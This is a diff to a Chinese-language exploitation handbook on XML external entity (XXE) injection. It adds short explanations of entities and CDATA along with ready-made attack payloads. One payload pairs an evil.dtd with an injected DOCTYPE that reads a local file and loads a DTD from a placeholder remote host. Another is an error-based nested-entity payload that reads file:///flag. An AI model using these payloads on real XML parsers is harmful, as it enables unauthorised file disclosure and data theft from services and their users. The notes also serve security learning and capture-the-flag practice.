@@ -1,5 +1,6 @@
 # EXP手册-XXE Injecton(XML External Entity Injection)
 ## 基础知识
+### 概念
 XXE(XML External Entity),即是XML外部实体注入攻击.漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。   
 关键在DTD的引用。   
 ```
@@ -17,9 +18,38 @@ DTD(The document type definition)，即是文档类型定义，可定义合法�
 <!ENTITY 实体名 SYSTEM url > //外部实体
 <!ENTITY 实体名 实体的值 > //内部实体
 ```
+用 &实体名; 引用的实体   
+用 % 实体名，引用参数实体，只能在 DTD 中使用 %实体名;
 
+### 读取文件有异常字符报错
+有些内容可能不想让解析引擎解析执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 <> & 或者
+" 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记   
+```
+<![CDATA[
+XXXXXXXXXXXXXXXXX
+]]>
+```
+#### Payload
+evil.dtd
+```
+<?xml version="1.0" encoding="UTF-8"?> 
+<!ENTITY all "%start;%goodies;%end;">
+```
+注入内容：   
+```
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE roottag [
+<!ENTITY % start "<![CDATA[">   
+  <!ENTITY % goodies SYSTEM "file:///d:/test.txt">  
+<!ENTITY % end "]]>">  
+<!ENTITY % dtd SYSTEM "http://ip/evil.dtd"> 
+%dtd; ]> 
 
-入门：  
+<roottag>&all;</roottag>
+```
+可以输入任意字符除了 ]]> 不能嵌套   
+用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来    
+### 入门：  
 - [一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)    
 - [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)
 ![](https://raw.githubusercontent.com/ReAbout/web-exp/master/images/xxe-injection.svg?sanitize=true)    
@@ -130,6 +160,20 @@ ubuntu系统自带的/usr/share/yelp/dtd/docbookx.dtd 包含%ISOamso
         &#x25;send;
     '> 
     %remote;
+]>
+```
+#### Payload3；
+有时候不引用外部DTD也可，原因在于代码实现3层嵌套下未严格执行标准。   
+```
+<?xml version="1.0"?>
+<!DOCTYPE message [
+    <!ELEMENT message ANY>
+    <!ENTITY % para1 SYSTEM "file:///flag">
+    <!ENTITY % para '
+        <!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;para1;&#x27;>">
+        &#x25;para2;
+    '>
+    %para;
 ]>
 ```
 ### Reference
